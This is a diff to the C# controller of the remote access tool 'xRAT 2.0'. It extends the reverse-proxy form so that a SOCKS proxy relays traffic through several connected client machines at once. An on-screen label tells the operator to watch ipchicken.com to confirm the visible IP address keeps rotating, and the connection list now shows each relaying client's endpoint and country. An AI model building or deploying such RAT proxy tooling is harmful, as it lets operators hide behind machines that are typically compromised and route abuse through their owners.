@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.ReverseProxy;
@@ -7,22 +8,36 @@ namespace xServer.Forms
 {
     public partial class FrmReverseProxy : Form
     {
-        private readonly Client _connectClient;
+        private readonly Client[] clients;
         private ReverseProxyServer SocksServer { get; set; }
         private delegate void Invoky();
         private ReverseProxyClient[] OpenConnections;
         private Timer RefreshTimer;
 
-        public FrmReverseProxy(Client client)
+        public FrmReverseProxy(Client[] clients)
         {
             InitializeComponent();
-            _connectClient = client;
-            _connectClient.Value.FrmProxy = this;
+            this.clients = clients;
+
+            for(int i = 0; i < clients.Length; i++)
+                clients[i].Value.FrmProxy = this;
         }
 
         private void FrmReverseProxy_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+            if (clients.Length > 1)
+            {
+                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [Load-Balancer is active]");
+
+                lblLoadBalance.Text = "The Load Balancer is active, " + clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
+
+            }
+            else if (clients.Length == 1)
+            {
+                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", clients[0].EndPoint.Address.ToString(), clients[0].EndPoint.Port.ToString());
+
+                lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
+            }
         }
 
         private void btnStart_Click(object sender, EventArgs e)
@@ -32,7 +47,7 @@ namespace xServer.Forms
                 SocksServer = new ReverseProxyServer();
                 SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                 SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
-                SocksServer.StartServer(_connectClient, "0.0.0.0", (int)nudServerPort.Value);
+                SocksServer.StartServer(clients, "0.0.0.0", (int)nudServerPort.Value);
                 btnStart.Enabled = false;
                 btnStop.Enabled = true;
 
@@ -107,10 +122,11 @@ namespace xServer.Forms
             //Stop the proxy server if still active
             btnStop_Click(sender, null);
 
-
-
-            if (_connectClient.Value != null)
-                _connectClient.Value.FrmProxy = null;
+            for (int i = 0; i < clients.Length; i++)
+            {
+                if (clients[i].Value != null)
+                    clients[i].Value.FrmProxy = null;
+            }
         }
 
         private void nudServerPort_ValueChanged(object sender, EventArgs e)
@@ -128,7 +144,9 @@ namespace xServer.Forms
 
                     e.Item = new ListViewItem(new string[]
                     {
-                        Connection.TargetServer,
+                        Connection.Client.EndPoint.ToString(),
+                        Connection.Client.Value.Country,
+                        Connection.TargetServer + (Connection.HostName.Length > 0 ? "    (" + Connection.HostName + ")" : ""),
                         Connection.TargetPort.ToString(),
                         GetSizeStr(Connection.LengthReceived),
                         GetSizeStr(Connection.LengthSended),
